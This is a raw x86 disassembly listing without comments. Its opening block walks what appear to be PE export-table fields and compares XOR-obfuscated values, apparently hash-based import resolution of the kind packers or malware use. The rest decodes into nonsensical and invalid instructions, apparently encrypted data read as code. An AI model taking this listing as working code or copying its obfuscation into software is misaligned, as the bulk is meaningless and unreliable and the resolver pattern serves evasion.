  406252:	add    ecx,DWORD PTR [eax+0x24]
  406255:	mov    DWORD PTR [ebp-0x34],ecx
  406258:	inc    ecx
  406259:	mov    eax,DWORD PTR [ebp-0x18]
  40625c:	sub    DWORD PTR ds:0x42b010,0x20b8
  406266:	mov    ecx,DWORD PTR [ebp+0x8]
  406269:	or     DWORD PTR ds:0x42a010,0x1874
  406273:	add    ecx,DWORD PTR [eax+0x1c]
  406276:	mov    eax,edi
  406278:	mov    DWORD PTR [ebp-0x18],ecx
  40627b:	jmp    0x4062db
  406280:	mov    ecx,DWORD PTR [ebp-0x2c]
  406283:	mov    edx,DWORD PTR [ebp+0x8]
  406286:	add    edx,DWORD PTR [ecx+esi*4]
  406289:	mov    DWORD PTR [ebp-0x28],edx
  40628c:	mov    ecx,DWORD PTR [ebp-0x4]
  40628f:	mov    edx,DWORD PTR [ebp-0x28]
  406292:	xor    ecx,ebx
  406294:	add    ecx,eax
  406296:	cmp    edx,ecx
  406298:	je     0x4062db
  40629e:	jmp    0x4062c7
  4062a3:	mov    ecx,DWORD PTR [ebp-0x4]
  4062a6:	mov    edx,DWORD PTR [ebp-0x8]
  4062a9:	xor    ecx,ebx
  4062ab:	add    ecx,eax
  4062ad:	cmp    edx,ecx
  4062af:	je     0x40631f
  4062b5:	mov    ecx,DWORD PTR [ebp-0x4]
  4062b8:	mov    edx,DWORD PTR [ebp-0x30]
  4062bb:	xor    ecx,ebx
  4062bd:	add    ecx,eax
  4062bf:	cmp    edx,ecx
  4062c1:	je     0x40632e
  4062c7:	lea    eax,[ebp-0x8]
  4062ca:	push   eax
  4062cb:	push   DWORD PTR [ebp-0x28]
  4062ce:	push   DWORD PTR [ebp+0xc]
  4062d1:	call   0x41c3b5
  4062d6:	mov    eax,0x3272db
  4062db:	mov    ecx,DWORD PTR [ebp-0x4]
  4062de:	mov    edx,DWORD PTR [ebp-0x8]
  4062e1:	xor    ecx,ebx
  4062e3:	add    ecx,eax
  4062e5:	cmp    edx,ecx
  4062e7:	je     0x406302
  4062ed:	mov    ecx,DWORD PTR [ebp-0x34]
  4062f0:	movzx  ecx,WORD PTR [ecx+esi*2]
  4062f4:	mov    edx,DWORD PTR [ebp-0x18]
  4062f7:	mov    ecx,DWORD PTR [edx+ecx*4]
  4062fa:	mov    DWORD PTR [ebp-0x38],ecx
  4062fd:	jmp    0x4062a3
  406302:	mov    ecx,DWORD PTR [ebp-0x14]
  406305:	xor    ecx,ebx
  406307:	lea    esi,[esi+ecx*1+0x3272db]
  40630e:	jmp    0x405fec
  406313:	mov    eax,DWORD PTR [ebp-0x4]
  406316:	xor    eax,ebx
  406318:	add    eax,edi
  40631a:	jmp    0x40cf3f
  40631f:	mov    eax,DWORD PTR [ebp-0x4]
  406322:	xor    eax,ebx
  406324:	add    eax,0x3272db
  406329:	jmp    0x40cf3f
  40632e:	mov    ecx,DWORD PTR [ebp-0x38]
  406331:	add    ecx,DWORD PTR [ebp+0x8]
  406334:	mov    DWORD PTR [ebp-0x10],ecx
  406337:	mov    ecx,DWORD PTR [ebp-0x1c]
  40633a:	test   ecx,ecx
  40633c:	je     0x40ceca
  406342:	mov    DWORD PTR [ebp-0x20],0x0
  406349:	jmp    0x4086d8
  40634e:	ins    BYTE PTR es:[edi],dx
  40634f:	pop    ebp
  406350:	(bad)  
  406351:	call   0xd5a4cae1
  406356:	xchg   esi,eax
  406357:	imul   esi,edx,0x66
  40635a:	and    ecx,DWORD PTR [ebx+0x3b38bc58]
  406360:	bound  esp,QWORD PTR [edx+0x10]
  406363:	pop    edi
  406364:	bound  esp,QWORD PTR [edx-0x47]
  406367:	adc    esi,esp
  406369:	sbb    eax,0xee40e740
  40636e:	jbe    0x40632b
  406370:	jns    0x406394
  406372:	xchg   ebp,eax
  406373:	cmp    esi,esi
  406375:	inc    ebx
  406376:	daa    
  406377:	ficomp DWORD PTR [ebx]
  406379:	add    BYTE PTR [edx+0x54],al
  40637c:	push   0x93df3cf1
  406381:	ret    
  406382:	popf   
  406383:	jmp    0x4063bf
  406385:	imul   esp,DWORD PTR [esi],0xe7303f7c
  40638b:	jb     0x40636f
  40638d:	int3   
  40638e:	pop    esi
  40638f:	or     DWORD PTR [edi+esi*2-0x327fd564],esi
  406396:	es (bad) 
  406398:	mov    al,0xb0
  40639a:	sub    DWORD PTR [edi+eiz*8],ecx
  40639d:	and    BYTE PTR [ecx+0x6993b3ba],ch
  4063a3:	jecxz  0x4063f0
  4063a5:	sbb    BYTE PTR [eax],bh
  4063a7:	fucomp st(7)
  4063a9:	outs   dx,BYTE PTR ds:[esi]
  4063aa:	xchg   esi,eax
  4063ab:	jb     0x4063c2
  4063ad:	xor    eax,0x1f2df55d
  4063b2:	ins    BYTE PTR es:[edi],dx
  4063b3:	xor    DWORD PTR [edx],ebp
  4063b5:	or     BYTE PTR [esi+esi*1],bl
  4063b8:	inc    BYTE PTR [esi]
  4063ba:	inc    DWORD PTR [eax]
  4063bc:	inc    edi
  4063bd:	les    esi,FWORD PTR [eax+0x70]
  4063c0:	and    DWORD PTR [edi+0x41],0xb7784402
  4063c7:	mov    edx,0x4d7be8e2
  4063cc:	ds adc eax,0x7df598ef
  4063d2:	xor    ax,0x9bf6
  4063d6:	push   esp
  4063d7:	push   edi
  4063d8:	mov    edi,0x4b7156b4
  4063dd:	retf   
  4063de:	pop    ss
  4063df:	pusha  
  4063e0:	mov    dl,BYTE PTR [ebp+0x48]
  4063e3:	retf   0xb222
  4063e6:	stos   DWORD PTR es:[edi],eax
  4063e7:	pop    ds
  4063e8:	aas    
  4063e9:	push   esi
  4063ea:	loope  0x4063a1
  4063ec:	repz push ecx
  4063ee:	call   0xe9085166
  4063f3:	imul   BYTE PTR [ebx-0x31]
  4063f6:	jmp    0xbc67964e
  4063fb:	scas   eax,DWORD PTR es:[edi]
  4063fc:	inc    BYTE PTR [edi-0x36]
  4063ff:	fmul   QWORD PTR [ebx*1+0x2db03817]
  406406:	lds    ecx,FWORD PTR [edi]
  406408:	cmc    
  406409:	rol    ebx,1
  40640b:	add    edx,esp
  40640d:	sub    BYTE PTR [eax-0x48],al
  406410:	fcomp  QWORD PTR [ebx+0x8a97a22]
  406416:	fwait
  406417:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406418:	pop    DWORD PTR [ecx+0x59]
  40641b:	int3   
  40641c:	in     eax,dx
  40641d:	mov    eax,0x647edb4c
  406422:	mov    gs,edx
  406424:	add    eax,0xf05afedd
  406429:	push   ds
  40642a:	stos   DWORD PTR es:[edi],eax
  40642b:	sub    ebp,eax
  40642d:	mov    gs,WORD PTR [edx-0x40e07459]
  406433:	adc    DWORD PTR [ecx-0x62],0xd96ffc92
  40643a:	jge    0x4064a2
  40643c:	lea    edx,[esi]
  40643e:	xlat   BYTE PTR ds:[ebx]
  40643f:	imul   eax,DWORD PTR [esi+0x26],0x4081c6d
  406446:	pusha  
  406447:	(bad)  
  406448:	jmp    0xad1e5fe3
  40644d:	imul   DWORD PTR [ebx+0x7bbaf3f2]
  406453:	pop    edx
  406454:	ss pop es
  406456:	fld    DWORD PTR [edi-0x5e6bbf2]
  40645c:	mov    edi,0x681a455d
  406461:	mov    dh,0x85
  406463:	adc    ch,cl
  406465:	sbb    esi,DWORD PTR [eax]
  406467:	push   eax
  406468:	sub    esp,DWORD PTR [ebp-0x30187b3d]
  40646e:	test   DWORD PTR [ebx+0x2f37fd3e],esi
  406474:	mov    ch,0xdc
  406476:	pop    esp
  406477:	adc    eax,edi
  406479:	cmp    eax,0x144265b3
  40647e:	aaa    
  40647f:	neg    BYTE PTR [eax-0x12fc0220]
  406485:	fnstcw WORD PTR gs:[ecx+0x58]
  406489:	xchg   ebx,eax
  40648a:	out    dx,eax
  40648b:	pop    ds
  40648c:	add    eax,0xd1dab31a
  406491:	lock fdivr DWORD PTR [eax]
  406494:	cmp    BYTE PTR [edx-0x4c538149],bh
  40649a:	sbb    ecx,DWORD PTR [eax-0x19]
  40649d:	pop    edx
  40649e:	pusha  
  40649f:	jmp    0x6542:0xd391a8b6
  4064a6:	lods   al,BYTE PTR ds:[esi]
  4064a7:	jae    0x40650e
  4064a9:	mov    dh,0x70
  4064ab:	add    al,0x85
  4064ad:	packuswb mm4,QWORD PTR [edx+0x760add0d]
  4064b4:	into   
  4064b5:	ins    BYTE PTR es:[edi],dx
  4064b6:	and    eax,0x3356545a
  4064bb:	adc    BYTE PTR [ebx],bl
  4064bd:	repnz in eax,0xac
  4064c0:	pop    edi
  4064c1:	cmp    bl,BYTE PTR [edx+0x28ef6436]
  4064c7:	cmp    DWORD PTR [edx-0x667ebfeb],edi
  4064cd:	inc    esi
  4064ce:	clc    
  4064cf:	dec    edx
  4064d0:	add    dl,BYTE PTR [eax+esi*8+0x6e]
  4064d4:	mov    eax,0xbbc3807f
  4064d9:	out    0x4d,al
  4064db:	mov    cl,0x1
  4064dd:	jno    0x40655e
  4064df:	js     0x406530
  4064e1:	and    bh,BYTE PTR [edx+0x49]
  4064e4:	dec    ebp
  4064e5:	cmp    esp,esi
  4064e7:	mov    DWORD PTR [esi+0xc],ebx
  4064ea:	cmp    bh,BYTE PTR [edx]
  4064ec:	lds    eax,FWORD PTR [ebx+0x5e442b54]
  4064f2:	mov    DWORD PTR [ebx],esp
  4064f4:	mov    dh,dh
  4064f6:	scas   al,BYTE PTR es:[edi]
  4064f7:	jmp    0x4aa7:0x34bd4cb6
  4064fe:	xchg   ebx,eax
  4064ff:	cwde   
  406500:	jmp    0x4064e0
  406502:	push   esi
  406503:	push   esp
  406504:	mov    eax,0xf076fa54
  406509:	ja     0x40651a
  40650b:	test   DWORD PTR [esi],eax
  40650d:	lds    eax,FWORD PTR [ebx+0x3]
  406510:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406511:	stos   DWORD PTR es:[edi],eax
  406512:	xchg   ebx,eax
  406513:	es xchg ebx,eax
  406515:	ins    DWORD PTR es:[edi],dx
  406516:	stc    
  406517:	out    0xac,eax
  406519:	repnz nop
  40651b:	mov    al,ds:0xf3d5c4a3
  406520:	mov    al,ds:0xa60dff0e
  406525:	and    al,0xf4
  406527:	and    BYTE PTR [ecx-0x599ae936],0x4e
  40652e:	sbb    DWORD PTR [edx+0x45],eax
  406531:	xlat   BYTE PTR ds:[ebx]
  406532:	rcl    BYTE PTR [eax-0x4],cl
  406535:	out    0x84,al
  406537:	pop    edx
  406538:	jmp    0x40652c
  40653a:	mov    WORD PTR [ebp+0x63],gs
  40653d:	mov    al,0xd5
  40653f:	stos   BYTE PTR es:[edi],al
  406540:	dec    ecx
  406541:	push   edx
  406542:	data16 xor dh,BYTE PTR [ecx+eax*8]
  406546:	stos   DWORD PTR es:[edi],eax
  406547:	es pop eax
  406549:	adc    BYTE PTR [edx-0x13],bl
  40654c:	jno    0x40659f
  40654e:	(bad)  
  40654f:	in     eax,0x6c
  406551:	loope  0x40653d
  406553:	(bad)  
  406554:	push   eax
  406555:	adc    ah,bh
  406557:	sbb    al,0xe1
  406559:	into   
  40655a:	mov    WORD PTR [edi+ecx*8],ss
  40655d:	xor    al,BYTE PTR ds:[eax+0x4e55774f]
  406564:	inc    ebx
  406565:	in     al,dx
  406566:	fcmovne st,st(5)
  406568:	jae    0x40656a
  40656a:	dec    eax
  40656b:	pop    esp
  40656c:	rcr    BYTE PTR [edx+edi*4-0x561713a9],1
  406573:	or     ebx,ebx
  406575:	fidiv  WORD PTR [esi]
  406577:	xchg   edi,eax
  406578:	scas   eax,DWORD PTR es:[edi]
  406579:	cmc    
  40657a:	mov    ah,0xbf
  40657c:	mov    edi,0x7076ea4f
  406581:	hlt    
  406582:	dec    eax
  406583:	sti    
  406584:	push   ss
  406585:	adc    BYTE PTR [edi+0x74],0x6
  406589:	mov    edx,0x372e6408
  40658e:	dec    esi
  40658f:	or     eax,0x5a51fe93
  406594:	jg     0x406559
  406596:	sbb    BYTE PTR [edi],ch
  406598:	lods   al,BYTE PTR ds:[esi]
  406599:	ret    0x8536
  40659c:	pop    esi
  40659d:	jecxz  0x40655d
  40659f:	add    edi,eax
  4065a1:	pop    edx
  4065a2:	outs   dx,BYTE PTR ds:[esi]
  4065a3:	out    dx,al
  4065a4:	cmp    DWORD PTR [ecx+0x1e2a96e3],ecx
  4065aa:	ins    DWORD PTR es:[edi],dx
  4065ab:	aaa    
  4065ac:	xor    al,0x35
  4065ae:	imul   esp,DWORD PTR [ecx+0x33dbdd95],0xffffffc3
  4065b5:	retf   
  4065b6:	int    0x92
  4065b8:	inc    edx
  4065b9:	das    
  4065ba:	dec    ecx
  4065bb:	cmc    
  4065bc:	mov    ecx,es
  4065be:	scas   eax,DWORD PTR es:[edi]
  4065bf:	xchg   ah,cl
  4065c1:	xchg   esi,eax
  4065c2:	push   es
  4065c3:	gs mov bl,0xaa
  4065c6:	das    
  4065c7:	(bad)  
  4065c8:	aas    
  4065c9:	stos   BYTE PTR es:[edi],al
  4065ca:	jecxz  0x4065d2
  4065cc:	fwait
  4065cd:	stc    
  4065ce:	daa    
  4065cf:	repz rcl DWORD PTR [ebx+0x6f0d62cc],1
  4065d6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4065d7:	ja     0x4065cb
  4065d9:	adc    BYTE PTR [ebx+0x4c],dh
  4065dc:	add    eax,0x950db6c3
  4065e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4065e2:	sahf   
  4065e3:	nop
  4065e4:	sti    
  4065e5:	int3   
  4065e6:	xchg   edi,eax
  4065e7:	xchg   esi,eax
  4065e8:	sub    dh,BYTE PTR [edi-0x67]
  4065eb:	mov    bl,dh
  4065ed:	aaa    
  4065ee:	sub    eax,DWORD PTR [ecx-0x25]
  4065f1:	fisub  DWORD PTR [eax+0x772c3ee0]
  4065f7:	rcr    BYTE PTR [ecx],0xca
  4065fa:	retf   
  4065fb:	mov    ds:0xf13e8dfc,al
  406600:	sbb    bh,bl
  406602:	inc    eax
  406603:	add    eax,0xe9e618a2
  406608:	pop    es
  406609:	sti    
  40660a:	sbb    ch,BYTE PTR [esi+edx*1]
  40660d:	mov    dl,0xe8
  40660f:	imul   ebp,DWORD PTR [esi+esi*4+0x3a],0x6c
  406614:	(bad)  
  406615:	and    al,0xc3
  406617:	clc    
  406618:	lods   al,BYTE PTR ds:[esi]
  406619:	add    BYTE PTR ds:0xe0288ce3,0xbf
  406620:	int    0xc4
  406622:	fldenv [eax]
  406624:	pushf  
  406625:	adc    DWORD PTR [edx+0x72],edi
  406628:	or     eax,0xccb05cf0
  40662d:	fbstp  TBYTE PTR [edx]
  40662f:	xor    al,0xb5
  406631:	out    0x87,al
  406633:	xchg   esp,eax
  406634:	mov    edx,0xa716fc97
  406639:	and    esp,esi
  40663b:	(bad)  
  40663c:	in     al,0x57
  40663e:	adc    BYTE PTR [esi+0x4e],dl
  406641:	mov    dl,0xb9
  406643:	mov    esp,0xcb59b0d0
  406648:	jp     0x406645
  40664a:	test   BYTE PTR [esi-0xe],0x56
  40664e:	cmp    eax,0xd493f5d
  406653:	xor    al,0x15
  406655:	inc    ebp
  406656:	(bad)  [ecx]
  406658:	repnz icebp 
  40665a:	mov    ch,0xdf
  40665c:	xchg   ebp,eax
  40665d:	inc    edx
  40665e:	into   
  40665f:	fnsave [ecx+esi*4]
  406662:	iret   
  406663:	pop    edi
  406664:	ret    0x2e3c
  406667:	sub    bh,BYTE PTR [edi-0x18]
  40666a:	gs ds xchg ebx,eax
  40666d:	rcr    BYTE PTR [esi+0x22ed5a1c],cl
  406673:	mov    ?,WORD PTR [edi]
  406675:	xor    ebx,edx
  406677:	(bad)  
  406678:	adc    eax,0x18516e64
  40667d:	and    bh,BYTE PTR [ecx-0x11a7611a]
  406683:	pop    ss
  406684:	fnstcw WORD PTR [esi-0x70bf50db]
  40668a:	jbe    0x406658
  40668c:	mul    cl
  40668e:	pop    ebp
  40668f:	jne    0x4066cf
  406691:	sub    al,al
  406693:	add    al,0x6
  406695:	int3   
  406696:	pop    eax
  406697:	cs in  eax,dx
  406699:	popf   
  40669a:	int3   
  40669b:	mov    dl,BYTE PTR [ebp-0x125ad955]
  4066a1:	js     0x40662a
  4066a3:	aaa    
  4066a4:	in     eax,dx
  4066a5:	xor    DWORD PTR [edx-0x1e03292d],ebx
  4066ab:	sti    
  4066ac:	xchg   edx,eax
  4066ad:	dec    eax
  4066ae:	dec    esp
  4066af:	sub    al,0x31
  4066b1:	push   ds
  4066b2:	push   ebx
  4066b3:	sbb    cl,bl
  4066b5:	popa   
  4066b6:	div    BYTE PTR [ebx+0x29]
  4066b9:	(bad)  
  4066ba:	idiv   DWORD PTR [ebx-0x27]
  4066bd:	or     bl,dl
  4066bf:	cmp    eax,0xc9794d4
  4066c4:	mov    esp,ebp
  4066c6:	dec    eax
  4066c7:	inc    ebx
  4066c8:	sub    esp,edx
  4066ca:	stos   DWORD PTR es:[edi],eax
  4066cb:	inc    esp
  4066cc:	pop    ebx
  4066cd:	push   ebp
  4066ce:	or     eax,0xc3f70149
  4066d3:	ret    
  4066d4:	jp     0x406684
  4066d6:	in     eax,dx
  4066d7:	stc    
  4066d8:	jl     0x4066c5
  4066da:	sub    DWORD PTR [ebx+0xa1e71cf],ebx
  4066e0:	adc    BYTE PTR [ebx+edx*8-0x632d4b5b],al
  4066e7:	or     BYTE PTR [eax+0x2b6a5ffc],ch
  4066ed:	int3   
  4066ee:	cdq    
  4066ef:	popf   
  4066f0:	jg     0x406707
  4066f2:	cdq    
  4066f3:	test   eax,0x46deecc5
  4066f8:	or     BYTE PTR [esi],cl
  4066fa:	jle    0x406756
  4066fc:	ds and al,0x5e
  4066ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406700:	sbb    eax,0x59ebe266
  406705:	loope  0x40676b
  406707:	and    al,BYTE PTR [esi]
  406709:	sub    dh,bh
  40670b:	pop    edi
  40670c:	js     0x406706
  40670e:	jno    0x406716
  406710:	fsubrp st(4),st
  406712:	mov    WORD PTR [eax+ebp*2],ds
  406715:	xor    eax,0x80690180
  40671a:	pop    ecx
  40671b:	mov    ecx,0xf8c44de7
  406720:	fidiv  WORD PTR [edi]
  406722:	inc    edx
  406723:	int3   
  406724:	lds    ecx,FWORD PTR [eax-0xc]
  406727:	pop    esp
  406728:	aas    
  406729:	lock aad 0x13
  40672c:	xchg   esp,eax
  40672d:	sub    ax,0x268c
  406731:	sub    DWORD PTR [edi],eax
  406733:	ins    DWORD PTR es:[edi],dx
  406734:	xchg   esi,eax
  406735:	push   edx
  406736:	and    al,0x2d
  406738:	je     0x40679e
  40673a:	fcom   QWORD PTR [edi]
  40673c:	inc    ebp
  40673d:	out    0xbe,eax
  40673f:	sub    al,0x95
  406741:	mov    eax,ds:0xd19afbaa
  406746:	(bad)  
  406748:	or     DWORD PTR [ebx],edx
  40674a:	jnp    0x4066ea
  40674c:	in     al,0x24
  40674e:	jp     0x4067be
  406750:	int3   
  406751:	fbstp  TBYTE PTR [esi+0x64]
  406754:	sbb    BYTE PTR [esi-0x1a],0x85
  406758:	cli    
  406759:	or     al,0xec
  40675b:	xlat   BYTE PTR ds:[ebx]
  40675c:	arpl   WORD PTR [esi+0x505743c5],dx
  406762:	fisttp QWORD PTR [ebx+0x732c754f]
  406768:	adc    ecx,DWORD PTR [ecx+0x41]
  40676b:	pop    fs
  40676d:	jp     0x406789
  40676f:	test   DWORD PTR [ebp+0x5f080031],ebp
  406775:	add    eax,0xfd151de9
  40677a:	(bad)  
  40677c:	cmp    ecx,edx
  40677e:	(bad)  
  40677f:	fdiv   QWORD PTR [eax]
  406781:	sar    ebp,0x47
  406784:	(bad)  
  406786:	pop    esp
  406787:	pop    esi
  406788:	scas   al,BYTE PTR es:[edi]
  406789:	fisttp WORD PTR [eax-0x25208114]
  40678f:	sbb    eax,0xcfce7a2
  406794:	popa   
  406795:	adc    bh,0xae
  406798:	scas   eax,DWORD PTR es:[edi]
  406799:	cld    
  40679a:	fstp   QWORD PTR [esi]
  40679c:	enter  0xc34f,0x86
  4067a0:	cmp    eax,0x22eeb0bb
  4067a5:	adc    esi,eax
  4067a7:	cld    
  4067a8:	add    ah,BYTE PTR [ebp+0x4d]
  4067ab:	sub    DWORD PTR [eax],0x2a
  4067ae:	pushf  
  4067af:	jl     0x40679f
  4067b1:	(bad)  
  4067b2:	cld    
  4067b3:	push   ss
  4067b4:	pop    edi
  4067b5:	pop    es
  4067b6:	jne    0x406743
  4067b8:	outs   dx,DWORD PTR ds:[esi]
  4067b9:	xchg   DWORD PTR [ecx+0x9],ecx
  4067bc:	mov    ecx,0x6570b0d8
  4067c1:	call   DWORD PTR [ebp+ebp*4+0x78781627]
  4067c8:	fs cmp al,0xd
  4067cb:	arpl   WORD PTR [ebx],cx
  4067cd:	push   ecx
  4067ce:	repz cmp BYTE PTR [eax+0x4d],bl
  4067d2:	das    
  4067d3:	rcr    dl,cl
  4067d5:	cli    
  4067d6:	pop    edx
  4067d7:	push   edx
  4067d8:	lock jb 0x4067ad
  4067db:	sbb    ecx,ecx
  4067dd:	xor    al,0xe5
  4067df:	adc    eax,0x5b01f98e
  4067e4:	or     al,0xbd
  4067e6:	(bad)
  4067e9:	test   DWORD PTR [eax+0x46e6cbda],ecx
  4067ef:	push   0x2fda684d
  4067f4:	xor    DWORD PTR [eax+ecx*1-0x1ca582ac],esp
  4067fb:	popa   
  4067fc:	sti    
  4067fd:	cmp    eax,DWORD PTR [edi-0x2f]
  406800:	and    eax,0xd9114d15
  406805:	jmp    0x40686b
  406807:	jae    0x4067c9
  406809:	push   eax
  40680a:	jg     0x4067bc
  40680c:	adc    ah,ah
  40680e:	cwde   
  40680f:	jb     0x406796
  406811:	clc    
  406812:	lds    esp,FWORD PTR [edx+0x39a0d083]
  406818:	fsubr  QWORD PTR [esi+ebx*1+0xc]
  40681c:	mov    eax,ds:0xb487e5aa
  406821:	ret    
  406822:	jo     0x406853
  406824:	(bad)  
  406825:	dec    edi
  406826:	inc    eax
  406827:	rcr    BYTE PTR [esi+0xc],1
  40682a:	mov    DWORD PTR [esi],eax
  40682c:	sahf   
  40682d:	(bad)  
  40682e:	fild   DWORD PTR [ebx-0x5f]
  406831:	add    al,0xaa
  406833:	sub    eax,DWORD PTR [esi+0x17]
  406836:	je     0x406851
  406838:	mov    eax,ds:0xdadf35bc
  40683d:	aas    
  40683e:	imul   ebp,esp,0x3d
  406841:	icebp  
  406842:	adc    DWORD PTR [ebx-0x3b68b157],edi
  406848:	inc    edi
  406849:	sub    cl,BYTE PTR [ecx+0x55464ff]
  40684f:	sbb    BYTE PTR [ebx],cl
  406851:	mov    ebx,0x8b53795f
  406856:	mov    edi,DWORD PTR [edx]
  406858:	pop    eax
  406859:	jmp    DWORD PTR [esi-0x5e55ef2b]
  40685f:	loopne 0x4068a4
  406861:	jne    0x406866
  406863:	shl    DWORD PTR [edi],0xac
  406866:	jno    0x4068db
  406868:	cli    
  406869:	cdq    
  40686a:	xchg   esp,eax
  40686b:	pop    edi
  40686c:	sbb    ah,BYTE PTR ds:0x101cfb
  406872:	push   ebx
  406873:	mov    ebp,0x8a4965fe
  406878:	mov    ecx,0xff846058
  40687d:	daa    
  40687e:	mov    ds:0xfb0fd360,eax
  406883:	out    0x6a,al
  406885:	(bad)  
  406886:	addr16 pop ss
  406888:	dec    DWORD PTR [ebx]
  40688a:	sbb    esp,DWORD PTR [ebx-0x40]
  40688d:	or     DWORD PTR [esi+edx*8+0x5d266872],ebp
  406894:	or     dh,BYTE PTR [edi+0x6b88a98]
  40689a:	out    dx,eax
  40689b:	call   0xe6b0:0xda6ef650
  4068a2:	mov    cs,WORD PTR [ebx]
  4068a4:	rcl    eax,cl
  4068a6:	ds mov al,0x13
  4068a9:	mov    ebp,0x90031867
  4068ae:	or     DWORD PTR [edi-0x6e868806],0xf14725b9
  4068b8:	inc    ecx
  4068b9:	push   ebx
  4068ba:	pop    esp
  4068bb:	sti    
  4068bc:	xchg   BYTE PTR [ecx-0x66],bl
  4068bf:	pop    ds
  4068c0:	pop    ss
  4068c1:	in     al,0x5d
  4068c3:	mov    al,ds:0xf0f2aa1f
  4068c8:	test   BYTE PTR [edx+0xb],ch
  4068cb:	lock pop ebx
  4068cd:	add    al,0x51
  4068cf:	sahf   
  4068d0:	xchg   DWORD PTR [esi+esi*1+0x971aa5e],ebp
  4068d7:	dec    ebp
  4068d8:	test   DWORD PTR [edi+eiz*1],esi
  4068db:	ins    BYTE PTR es:[edi],dx
  4068dc:	pop    edi
  4068dd:	and    ch,ch
  4068df:	mov    dh,0xe6
  4068e1:	xchg   BYTE PTR [edi-0x9],cl
  4068e4:	pop    ebp
  4068e5:	call   0x7978c4ae
  4068ea:	cmp    DWORD PTR [edx+esi*2+0x49],ecx
  4068ee:	repnz xor edx,edi
  4068f1:	xor    BYTE PTR [esi+0x38d629da],ah
  4068f7:	pop    ebx
  4068f8:	mov    bl,0xd1
  4068fa:	div    BYTE PTR [eax+ebx*1]
  4068fd:	dec    edx
  4068fe:	jmp    0x70b3fac0
  406903:	aad    0x18
  406905:	outs   dx,BYTE PTR ds:[esi]
  406906:	sub    DWORD PTR [edi-0x4a],ecx
  406909:	inc    eax
  40690a:	cmp    dl,BYTE PTR [ebx]
  40690c:	mov    al,ds:0x5cbe2c43
  406911:	ret    0x8da7
  406914:	xor    eax,0xaf3ece37
  406919:	add    eax,0xc08306d4
  40691e:	push   ss
  40691f:	or     eax,DWORD PTR [esi-0x3286f41c]
  406925:	fdivr  QWORD PTR [edx]
  406927:	lahf   
  406928:	pop    ebp
  406929:	fisubr WORD PTR [ebp-0x20]
  40692c:	mov    cl,0x18
  40692e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40692f:	cmp    DWORD PTR cs:[edx],eax
  406932:	pop    eax
  406933:	mov    bl,0x51
  406935:	imul   eax,DWORD PTR [edi],0x1d9e905d
  40693b:	dec    ebp
  40693c:	xchg   edx,ebx
  40693e:	in     al,dx
  40693f:	or     al,0xb2
  406941:	sub    eax,0xfdfd2667
  406946:	jne    0x406937
  406948:	push   es
  406949:	test   eax,0x8ae289ba
  40694e:	and    BYTE PTR [ebp-0x351a833e],al
  406954:	xor    al,0x35
  406956:	cmp    ah,cl
  406958:	jecxz  0x4069ce
  40695a:	jmp    0xd7221110
  40695f:	pop    ebx
  406960:	fs data16 sbb al,0x65
  406964:	push   es
  406965:	jl     0x4069db
  406967:	lds    edi,FWORD PTR [eax]
  406969:	pusha  
  40696a:	ret    0x3261
  40696d:	cmp    al,dh
  40696f:	outs   dx,DWORD PTR ds:[si]
  406971:	or     al,0xc7
  406973:	adc    al,0x4a
  406975:	enter  0xcc9f,0x3f
  406979:	shl    DWORD PTR [eax-0x6b],0x7a
  40697d:	aad    0x47
  40697f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406980:	imul   ecx,DWORD PTR [ecx-0x2e123932],0x281be3e2
  40698a:	xchg   cl,dh
  40698c:	neg    BYTE PTR [edx+0x66]
  40698f:	mov    ds:0x1d579b67,al
  406994:	jecxz  0x406975
  406996:	sbb    eax,0x44c1b558
  40699b:	imul   esi,ebx,0xc1ba46d6
  4069a1:	rol    al,1
  4069a3:	mov    ds:0xd3e74c7e,al
  4069a8:	aam    0xf0
  4069aa:	cs loopne 0x406994
  4069ad:	push   ecx
  4069ae:	std    
  4069af:	mov    ds:0x6cab7797,eax
  4069b4:	jae    0x406a0e
  4069b6:	sbb    DWORD PTR [ecx],esi
  4069b8:	daa    
  4069b9:	push   ds
  4069ba:	pop    edx
  4069bb:	or     al,0x5d
  4069bd:	fisubr WORD PTR [ebp+0x79]
  4069c0:	xor    al,0x6e
  4069c2:	fsub   QWORD PTR [bx+si+0x75bb]
  4069c7:	call   0xb709dbe8
  4069cc:	lds    edi,FWORD PTR [ecx]
  4069ce:	inc    ebx
  4069cf:	mov    bh,0xc8
  4069d1:	ret    
  4069d2:	dec    esi
  4069d3:	jb     0x4069ac
  4069d5:	cmc    
  4069d6:	fadd   DWORD PTR [ebx+0x37e8d57f]
  4069dc:	mov    al,0xa9
  4069de:	iret   
  4069df:	push   es
  4069e0:	jmp    0xc52a:0x2f712cb4
  4069e7:	mov    ah,0x70
  4069e9:	adc    DWORD PTR [ebp+0x53],esp
  4069ec:	aam    0x67
  4069ee:	outs   dx,BYTE PTR ds:[esi]
  4069ef:	imul   esp,DWORD PTR [edi],0x32
  4069f2:	pop    DWORD PTR [ecx-0x67]
  4069f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4069f6:	fwait
  4069f7:	cdq    
  4069f8:	inc    ecx
  4069f9:	int    0xfd
  4069fb:	push   0xffffffec
  4069fd:	shl    BYTE PTR [esi+0x7b449811],cl
  406a03:	cwde   
  406a04:	lock je 0x406a2f
  406a07:	scas   al,BYTE PTR es:[edi]
  406a08:	jo     0x4069a6
  406a0a:	int3   
  406a0b:	jmp    0xe69f:0xd0d8c1a3
  406a12:	xchg   edx,eax
  406a13:	inc    ebp
  406a14:	push   edi
  406a15:	std    
  406a16:	jp     0x406a6b
  406a18:	(bad)  
  406a19:	or     al,0x2f
  406a1b:	mov    ecx,0x9b677d01
  406a20:	out    dx,al
  406a21:	pop    es
  406a22:	jmp    0x8ef6765d
  406a27:	pop    esi
  406a28:	fucomp st(3)
  406a2a:	aaa    
  406a2b:	clc    
  406a2c:	add    bh,BYTE PTR [eax+0x56]
  406a2f:	cs popf 
  406a31:	xchg   ebx,eax
  406a32:	or     ebx,DWORD PTR [edx-0x68cd74ad]
  406a38:	mov    bl,0x6
  406a3a:	jmp    0x8a5b:0x54d1c752
  406a41:	jne    0x406a6f
  406a43:	xor    eax,0xe8bf748
  406a48:	lods   al,BYTE PTR ds:[esi]
